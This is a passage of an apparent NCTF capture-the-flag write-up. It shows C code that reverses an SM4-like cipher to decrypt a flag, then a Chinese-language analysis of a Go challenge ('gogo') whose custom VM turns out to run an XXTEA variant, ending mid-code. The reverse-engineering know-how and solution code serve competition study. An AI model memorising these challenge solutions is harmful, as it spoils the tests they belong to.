number\">0xE0E7EEF5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFC030A11</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x181F262D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x343B4249</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x50575E65</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6C737A81</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x888F969D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA4ABB2B9</span><span class=\"token punctuation\">,</span>\n<span class=\"token number\">0xC0C7CED5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDCE3EAF1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF8FF060D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x141B2229</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x30373E45</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4C535A61</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x686F767D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x848B9299</span><span class=\"token punctuation\">,</span>\n<span class=\"token number\">0xA0A7AEB5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBCC3CAD1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD8DFE6ED</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF4FB0209</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10171E25</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2C333A41</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x484F565D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x646B7279</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> dword_7FF699A4A028<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n<span class=\"token number\">0xA3B1BAC6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x56AA3350</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x677D9197</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB27022DC</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">static</span> <span class=\"token keyword\">inline</span> <span class=\"token keyword\">uint32_t</span> <span class=\"token function\">rotate_left</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">uint32_t</span> x<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> n<span class=\"token punctuation\">)</span> \n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token generic-function\"><span class=\"token function\">x</span> <span class=\"token generic class-name\"><span class=\"token operator\">&lt;&lt;</span> n<span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span>x <span class=\"token operator\">>></span></span></span> <span class=\"token punctuation\">(</span><span class=\"token number\">32</span> <span class=\"token operator\">-</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">generate_buf</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">uint8_t</span><span class=\"token operator\">*</span> key<span class=\"token punctuation\">,</span> <span class=\"token keyword\">uint32_t</span><span class=\"token operator\">*</span> buf<span class=\"token punctuation\">)</span> \n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> \n        <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">uint32_t</span> key_dword<span class=\"token punctuation\">;</span>\n            <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>key_dword<span class=\"token punctuation\">,</span> key <span class=\"token operator\">+</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> i<span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">uint32_t</span> converted_key <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>key_dword <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span>\n            <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>key_dword <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF00</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span>\n            <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>key_dword <span class=\"token operator\">>></span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF00</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span>\n            <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>key_dword <span class=\"token operator\">>></span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            buf<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> dword_7FF699A4A028<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> converted_key<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> <span class=\"token number\">32</span><span class=\"token punctuation\">;</span> j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> \n        <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">uint32_t</span> v12 <span class=\"token operator\">=</span> dword_7FF699A4A040<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> buf<span class=\"token punctuation\">[</span>j <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> buf<span class=\"token punctuation\">[</span>j <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> buf<span class=\"token punctuation\">[</span>j <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">uint8_t</span><span class=\"token operator\">*</span> v12_bytes <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">uint8_t</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>v12<span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> k <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> k <span class=\"token operator\">&lt;</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span> k<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">&#123;</span>\n                    v12_bytes<span class=\"token punctuation\">[</span>k<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> byte_7FF699A4A0D0<span class=\"token punctuation\">[</span>v12_bytes<span class=\"token punctuation\">[</span>k<span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">uint32_t</span> rot1 <span class=\"token operator\">=</span> <span class=\"token function\">rotate_left</span><span class=\"token punctuation\">(</span>v12<span class=\"token punctuation\">,</span> <span class=\"token number\">23</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">uint32_t</span> rot2 <span class=\"token operator\">=</span> <span class=\"token function\">rotate_left</span><span class=\"token punctuation\">(</span>v12<span class=\"token punctuation\">,</span> <span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        buf<span class=\"token punctuation\">[</span>j <span class=\"token operator\">+</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>rot1 <span class=\"token operator\">^</span> rot2 <span class=\"token operator\">^</span> v12<span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> buf<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">decrypt</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">uint8_t</span><span class=\"token operator\">*</span> ciphertext<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">uint8_t</span><span class=\"token operator\">*</span> key<span class=\"token punctuation\">,</span> <span class=\"token keyword\">uint8_t</span><span class=\"token operator\">*</span> plaintext<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">uint32_t</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">36</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">uint32_t</span> buf_1<span class=\"token punctuation\">[</span><span class=\"token number\">36</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">generate_buf</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> ii <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> ii <span class=\"token operator\">&lt;</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span> ii<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">uint32_t</span> cipher_dword<span class=\"token punctuation\">;</span>\n        <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>cipher_dword<span class=\"token punctuation\">,</span> ciphertext <span class=\"token operator\">+</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> ii<span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        buf_1<span class=\"token punctuation\">[</span><span class=\"token number\">35</span> <span class=\"token operator\">-</span> ii<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>cipher_dword <span class=\"token operator\">>></span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span>\n            <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>cipher_dword <span class=\"token operator\">>></span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF00</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span>\n            <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>cipher_dword <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF0000</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span>\n            <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>cipher_dword <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF000000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> m <span class=\"token operator\">=</span> <span class=\"token number\">31</span><span class=\"token punctuation\">;</span> m <span class=\"token operator\">>=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> m<span class=\"token operator\">--</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">uint32_t</span> v12_0 <span class=\"token operator\">=</span> buf<span class=\"token punctuation\">[</span>m <span class=\"token operator\">+</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> buf_1<span class=\"token punctuation\">[</span>m <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> buf_1<span class=\"token punctuation\">[</span>m <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> buf_1<span class=\"token punctuation\">[</span>m <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">uint8_t</span><span class=\"token operator\">*</span> v12_bytes <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">uint8_t</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>v12_0<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> n <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> n <span class=\"token operator\">&lt;</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span> n<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> \n        <span class=\"token punctuation\">&#123;</span>\n            v12_bytes<span class=\"token punctuation\">[</span>n<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> byte_7FF699A4A0D0<span class=\"token punctuation\">[</span>v12_bytes<span class=\"token punctuation\">[</span>n<span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">uint32_t</span> rot1 <span class=\"token operator\">=</span> <span class=\"token function\">rotate_left</span><span class=\"token punctuation\">(</span>v12_0<span class=\"token punctuation\">,</span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">uint32_t</span> rot2 <span class=\"token operator\">=</span> <span class=\"token function\">rotate_left</span><span class=\"token punctuation\">(</span>v12_0<span class=\"token punctuation\">,</span> <span class=\"token number\">18</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">uint32_t</span> rot3 <span class=\"token operator\">=</span> <span class=\"token function\">rotate_left</span><span class=\"token punctuation\">(</span>v12_0<span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">uint32_t</span> rot4 <span class=\"token operator\">=</span> <span class=\"token function\">rotate_left</span><span class=\"token punctuation\">(</span>v12_0<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">uint32_t</span> L_result <span class=\"token operator\">=</span> rot1 <span class=\"token operator\">^</span> rot2 <span class=\"token operator\">^</span> rot3 <span class=\"token operator\">^</span> rot4 <span class=\"token operator\">^</span> v12_0<span class=\"token punctuation\">;</span>\n        buf_1<span class=\"token punctuation\">[</span>m<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> buf_1<span class=\"token punctuation\">[</span>m <span class=\"token operator\">+</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> L_result<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">uint32_t</span> v11 <span class=\"token operator\">=</span> buf_1<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">uint8_t</span> b0 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>v11 <span class=\"token operator\">>></span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">uint8_t</span> b1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>v11 <span class=\"token operator\">>></span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">uint8_t</span> b2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>v11 <span class=\"token operator\">>></span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">uint8_t</span> b3 <span class=\"token operator\">=</span> v11 <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">uint32_t</span> le <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>b3 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span>b2 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span>b1 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> b0<span class=\"token punctuation\">;</span>\n        <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>plaintext <span class=\"token operator\">+</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> i<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>le<span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main_safe</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">uint8_t</span> key<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"NCTF24nctfNCTF24\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> enc<span class=\"token punctuation\">[</span><span class=\"token number\">32</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token number\">0xFB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x97</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x99</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x12</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x13</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x30</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6C</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x14</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x05</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x76</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x36</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x46</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> flag<span class=\"token punctuation\">[</span><span class=\"token number\">32</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">decrypt</span><span class=\"token punctuation\">(</span>enc<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">,</span> flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">decrypt</span><span class=\"token punctuation\">(</span>enc<span class=\"token operator\">+</span><span class=\"token number\">16</span><span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">,</span> flag<span class=\"token operator\">+</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"NCTF&#123;%.32s&#125;\\n\"</span><span class=\"token punctuation\">,</span> flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    \n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n\n<h3 id=\"gogo\"><a href=\"#gogo\" class=\"headerlink\" title=\"gogo\"></a>gogo</h3><p>main_main函数可以看到是将输入分块通过channel进行协程通信。</p>\n<p><img src=\"/images/1742733969787-21f818ea-b6be-4352-b828-76c4dc10e07f.png\"></p>\n<p>在main_main函数附件有一个带VM名字的函数，里面就是接收main那边发送的数据，然后底下有个函数执行，是通过操作数进行调用函数计算。这边一系列计算函数也印证想法。</p>\n<p><img src=\"/images/1742734066317-01e3231e-c23a-4e3f-a5d0-e97c7be1dca8.png\"></p>\n<p><img src=\"/images/1742734121024-155535f9-6bfc-4362-903a-2dfd143e5b9b.png\"></p>\n<p>对每个vm的函数都下断点输出，如XOR这样：</p>\n<p><img src=\"/images/1742734219948-32e06585-6800-4f9b-8edc-494765f3de6e.png\"></p>\n<p><img src=\"/images/1742734255077-9adf8f22-88a0-4158-9da6-92eaa88ff49e.png\"></p>\n<p>运行输入可以得到一堆伪代码计算过程，通过看到9e3779b9以及计算的特征，可以发现是XXTEA变种。</p>\n<p><img src=\"/images/1742734417878-d64fe88d-06aa-4999-9e95-396404fccb0d.png\"></p>\n<p><img src=\"/images/1742735420532-84d41ca0-3eed-4411-80d2-858709f02190.png\"></p>\n<p>通过分析可得知是将flag分成两份，20字节为一组，分别进行两种变种XXTEA计算，Key也不一样，不过都在这里面可以找到Key。</p>\n<p>还原加密代码如下，基于标准XXTEA进行修改的：</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">DELTA</span> <span class=\"token expression\"><span class=\"token number\">0x9e3779b9</span></span></span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">MX</span> <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>z <span class=\"token operator\">>></span> <span class=\"token number\">5</span> <span class=\"token operator\">^</span> y <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>y <span class=\"token operator\">>></span> <span class=\"token number\">3</span> <span class=\"token operator\">^</span> z <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>sum <span class=\"token operator\">^</span> y<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>p <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> e<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> z<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></span></span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">MX2</span> <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>z <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">5</span> <span class=\"token operator\">^</span> y <span class=\"token operator\">>></span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>y <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">3</span> <span class=\"token operator\">^</span> z <span class=\"token operator\">>></span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>sum <span class=\"token operator\">^</span> y<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>key2<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>p <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> e<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> z<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></span></span>\n\n<span class=\"token keyword\">uint32_t</span> key<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span> <span class=\"token number\">0x6e637466</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x62ef0ed</span> <span class=\"token punctuation\">,</span><span class=\"token number\">0xa78c0b4f</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x32303234</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">uint32_t</span> key2<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span> <span class=\"token number\">0x32303234</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xd6eb12c3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9f1cf72e</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4e435446</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">xxtea_1</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">uint32_t</span><span class=\"token operator\">*</span> v<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> n<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">uint32_t</span> y<span class=\"token punctuation\">,</span> z<span class=\"token punctuation\">,</span> sum<span class=\"token 